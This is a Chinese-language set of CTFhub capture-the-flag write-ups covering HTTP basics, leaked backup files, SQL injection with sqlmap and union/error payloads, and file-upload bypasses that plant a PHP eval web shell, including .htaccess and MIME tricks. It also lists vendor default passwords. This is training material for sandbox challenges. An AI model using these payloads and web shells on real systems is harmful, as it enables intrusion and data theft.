CTFhub 收集

# CTFhub 收集

> 本文专门用作CTFhub收集, 用的Writeup 都是官网发出的, 非本人相处,
>
> 本人知识照着练了, 如有侵权, 联系本人, 本人立即删除.

# Web

## Web 前置技能

### 1. 请求方式

**知识点: **

1. **HTTP Method 是可以自定义的**
2. **要会用 **`**curl**`

**解:**
```
curl -v -X CTFHUB http://网址/index.php
```

### 2. 302跳转

知识点:
HTTP状态码的判别, 利用.
> 两种方法

```
# 用电脑的curl访问所给网址的index.php文件
curl -v http://challenge-e4c68cf085b13e80.sandbox.ctfhub.com:10800/index.php

得到:
ctfhub{45b0a7a388cf0cf49962b91f}
```

> 方法二: 直接用bp抓包, 删除里面实现跳转的内容

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1679236082459-db25691b-73c8-4dcb-b42a-ec673430a215.png#averageHue=%23f3f0ef&clientId=u0d1dd242-5fc3-4&from=paste&height=828&id=u027f438e&name=image.png&originHeight=932&originWidth=586&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=138280&status=done&style=none&taskId=u70684ac6-3ab7-453c-878e-a920bd8375c&title=&width=520.8888888888889)

### 3.Cookie (两背后有个请求)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1679402775918-52ebb374-1f19-4684-8296-e21c7dfe0805.png#averageHue=%23ebe5e2&clientId=ue61c5083-4db1-4&from=paste&height=434&id=u9e8abcf8&name=image.png&originHeight=488&originWidth=1315&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=115748&status=done&style=none&taskId=u2b5863fc-8915-49f2-9cdb-5bc682cf32b&title=&width=1168.888888888889)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1679402854427-88e37538-477e-4545-bd94-8fc854c2602f.png#averageHue=%23f6f4f3&clientId=ue61c5083-4db1-4&from=paste&height=515&id=uc4a9629e&name=image.png&originHeight=579&originWidth=969&originalType=binary&ratio=1.125&rotation=0&showTitle=true&size=86035&status=done&style=none&taskId=u4c4d02b6-1b18-409d-9bab-b7881ebcbfc&title=%E6%8B%BF%E5%88%B0%20flag&width=861.3333333333334 "拿到 flag")

### 4.基础认证

**知识点参考:**
[https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81](https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1679403942434-55d98d3a-ec16-4534-abd4-be036dba8208.png#averageHue=%23e3dfdf&clientId=ue61c5083-4db1-4&from=paste&height=748&id=u427535f4&name=image.png&originHeight=841&originWidth=1025&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=79997&status=done&style=none&taskId=ub91dc618-9108-41b8-b6d0-a3f02294455&title=&width=911.1111111111111)
> **上方图片敲的时候少敲了,  前缀应该是  **`**admin:**`

> 注意 :  要用官方**附件的**密码进行爆破, 


![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1679404995434-69f110ba-a320-4633-be02-6590b15a3b67.png#averageHue=%23e4be81&clientId=ue61c5083-4db1-4&from=paste&height=125&id=u39fe6d4d&name=image.png&originHeight=141&originWidth=450&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=12455&status=done&style=none&taskId=u339f929f-65ad-4d22-9bad-27707465cae&title=&width=400)
> 成功!

### 5.请求响应包(查看源码有惊喜)

> 本关直接登录网址, 然后**直接查看源代码, ** ctfhub 就在一段注释中,  ** 文字识别工具识别复制即可**





### 6. bak 文件

> 通过扫描目录, (**能够下载的文件目录**), 来拿到由于开发者忘记删除的一些文件

![image-20230330165618910](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230330165618910.png)

> 直接下载: index.php.bak 就行.



### 7. vim缓存

> 直接输入:

```
curl http://challenge-8cbf2f9267a35edd.sandbox.ctfhub.com:10800/.index.php.swp
```

因为是`二进制文件, `所以很多时候终端没法打开, 可能根据`curl的报错, 补上响应的命令参数`



### 8 .DS Store

`.DS Store`是Mac OS保存文件夹的自定义属性的隐藏文件。通过.DS Storei可以知道这个目录里面所有文件的清单。

![image-20230330180154934](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230330180154934.png)



### 9. Git, SVN等的信息泄露

> 本部分由于工具的使用不当, 本人现在未作出来,
>
> 之后再来补充



### 10. 弱口令

> 知识点, 弱口令就是别人能猜到, 或者爆破出来你的账号和密码.

直接利用`BP`进行爆破.

**BP知识点:(爆破的四种模式)**

1. Sniper(狙击手), 只会对单个字段进行爆破
2. Battering ram(攻城锤) ,  可以是单个字段(此时作用和Sniper模式一样了) , 可以是两个字段, 但是这两个字段爆破的时候同时填上相同的值
3. Pitchfork(草叉), 例如: (账号, 密码)  这样按照组合的形式填入
4. Cluster bomb(集束炸弹), 在账号和密码都不知道的情况下, 开启此种模式,进行笛卡尔积式的爆破.

### 11.默认口令

> 当看到一个比较流行的网页登录窗口的时候, 攻击者可以尝试通过搜索相关产品的厂家默认账号和密码. 可能有些用户没有修改账号和密码. 

例如: eyou 邮箱.

eyouuser eyou_admin 
eyougw admin@(eyou) 
admin +-ccccc 
admin cyouadmin



# SQl注入

1. **整型** 和 **字符型** 注入(使用sqlmap 依次执行下方的命令)

   **注意: 每个人的 url , 不要写错, 应该填写自己的目标url**

```
sqlmap -u http://challenge-55b8bfa6d87fb500.sandbox.ctfhub.com:10800/?id=1 --tables
sqlmap -u http://challenge-55b8bfa6d87fb500.sandbox.ctfhub.com:10800/?id=1 --T flag --tables
sqlmap -u http://challenge-55b8bfa6d87fb500.sandbox.ctfhub.com:10800/?id=1 -T flag --columns
sqlmap -u http://challenge-55b8bfa6d87fb500.sandbox.ctfhub.com:10800/?id=1 -T flag -C flag --dump

```

1. `--table`   和	`-T`    ========> 列出所有的表(此处的表叫 flag)
2. `--columns`  和 `-C`  =========>列出表名里的字段名 (此处的字段也叫 flag)
3. `--dump` 展现字段内所有的数据.



## 报错注入

```
http://challenge-15c1298fcd91ebd0.sandbox.ctfhub.com:10080/
?id=1 and extractvalue(1,concat(0x7e,database(),0x7e))--+
```



### Cookie注入

> 因为cookie里面有字段, 这个字段可以被带到数据库中, 所以才可以通过这个cookie中的字段进行注入.

1. 用BP抓取数据包, 发现cookie里面有字段, 查看有几个字段:

```
id = 1 order by 1
```

![image-20230402111108748](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230402111108748.png)



> 下面查看是否有回显,

![image-20230402111943629](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230402111943629.png)

> 接着, 获取库名

![image-20230402112326168](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230402112326168.png)

> 查询数据库, 得到表名(**注意: 因为这个数据库的版本是大于5.0的, 所以才能用information_schemaa 来查**)

```
id = -1 union select table_name,2 from information_schema.tables where table_schema = 'sqli'
```

![image-20230402112832188](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230402112832188.png)

> 同样的放吧得到列名,  然后从表里面拿到 **列里面的数据(flag)**

![image-20230402113327150](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230402113327150.png)



# 文件上传

### uploadfile第一题: 无验证

1. 直接构造一句话木马

```
<?php
<?php @eval($_POST['shell']);?>
?>
```

> 构造的依据话木马的**密码就是a**

2.  因为本关是无验证, 所以说直接上传文件即可

访问提示并拼接url  , 注意检查一下是否正确,(`url可能缺少 斜杆 之类的`)

3. 用蚁剑连接(最好先测试一下, 然后再去添加)

   ![image-20230402213752030](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230402213752030.png)



### uploadfile第二题: JS前端验证

> 本题通过 过滤后缀来达到验证的目的 , 可以右键 **查看源代码**

![image-20230402214127933](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230402214127933.png)

1. 将文件**后缀名修改为允许的后缀**,     之后 **直接**BP**抓包**, 查看并修改后缀

   ![image-20230402214607286](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230402214607286.png)

2. 用中国蚁剑连接就行( **`注意: 连接的地址是 php 文件, 而不是jpg`**)

![image-20230402215457499](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230402215457499.png)



### uploadfile 第三题 .htaccess

> 本关直接绕过黑名单的后缀就就可以了,  发现` .htaccess 这个windows下的系统后缀没有在黑名单中欧, 天助我也!`

可以右键, 查看源代码. 可以看到, 网页限制规则指定的是`blacklist`黑名单.

思路: 

> 上传一个 被允许的文件 a , 在上传一个可以解析这个文件的文件 b.
>
> 让b文件去解析a ,  解析的方式按照我们想要的方式, 例如:  **将png 文件解析为    php 文件**
>
> 这个能够进行解析的文件就是`.htaccess`文件.



1. 上传编辑好的 `.htaccess `  和 `ctfhub.php`

   其中 `.htaccess`的内容如下, 意思是`将png 解析为 php`为

```
AddType application/x-httpd-php .png
```

2. 上传

   ![image-20230403175819492](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230403175819492.png)

   ![image-20230403180049054](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230403180049054.png)

3. **在蚁剑中输入**:    题目网页的url/upload/ctfhub.php

4. ![image-20230403181154642](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230403181154642.png)



### uploadfile  第四题  MIME 绕过

原理:MIME类型校验就是我们在**上传文件到服务端**的时候，服务端会对客户端也就是我们上传的文件的**Content-Type类型**进行检测，如果是白名单所允许的，则可以正常上传，否则上传失败。

> 也就是说在 返回的数据包中, php  会对应一个 **Content-Type** 字段, 但是上传php本身是不被允许的, 所以说, 将 **Content-Type** 改为被 允许的就行, 比如`image/jpeg`, (可以先上传一个文件试试, 看那些类型的文件时被允许的.)

1. 直接上传 名叫`ctfhub.php`为文件, 只要是一个一句话木马的文件就行
2. 将最下面的 **Content-Type** 对应的值, 替换为`image/jpeg`
3. 上传成功后, 用蚁剑连接, 拿到flag.

![image-20230404104136891](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230404104136891.png)

> 之后可以直接拿到flag

# 彩蛋

## 首页

> 直接访问下面的地址, 搜索`flag`, 既可以看到啦!

```
view-source:https://api.ctfhub.com/#/index
```

![image-20230330174838941](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230330174838941.png)



